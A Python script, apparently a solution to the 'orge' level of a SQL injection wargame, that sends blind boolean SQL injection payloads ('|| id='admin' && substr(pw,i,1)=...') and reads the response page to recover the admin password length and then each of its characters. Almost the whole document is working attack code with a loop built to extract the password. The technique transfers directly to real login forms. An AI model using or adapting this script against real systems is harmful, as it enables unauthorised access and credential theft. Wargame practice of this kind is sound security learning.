
import requests
from bs4 import BeautifulSoup
import time

pw = ''
pwlength = 0

def requestURL(value):
    URL = "https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?"
    cookie = {'cookie': ''} # input your cookie value
    change_url = URL + value
    # print(change_url)

    resp = requests.get(change_url, cookies=cookie)
    if resp.status_code == 200:
        soup = BeautifulSoup(resp.text, 'html.parser') # html code
        if soup.find_all(text='Hello admin'):
            global finish
            finish = 1 # find value
            time.sleep(1)
        else:
            finish = 0
        return finish

def find_length(find_length):
    global pwlength
    for i in range(1, 50):  # length
        parameter = find_length + str(i)
        requestURL(parameter)
        if finish == 1:
            pwlength = i
            print("The password length is ", pwlength)
            break

def find_pw(numtext):
    global pw, stop
    parameter = "pw=' || id='admin' %26%26 substr(pw," + str(i) + ",1)='" + numtext
    finish = requestURL(parameter)
    if finish == 1: # find
        pw += numtext
        # print(pw)
        return finish

find_length("pw=' || id='admin' %26%26 length%28pw%29='")

for i in range(1, pwlength+1):
    for j in range(0, 10):
        stop = find_pw(str(j)) # num
        if stop == 1:
            break

        if j==9 and finish==0:
            for k in range(97, 122):
                stop = find_pw(chr(k)) # alpabet
                if stop == 1:
                    break
        # time.sleep(0) # Control time
    finish = 0

print("password is ", pw)
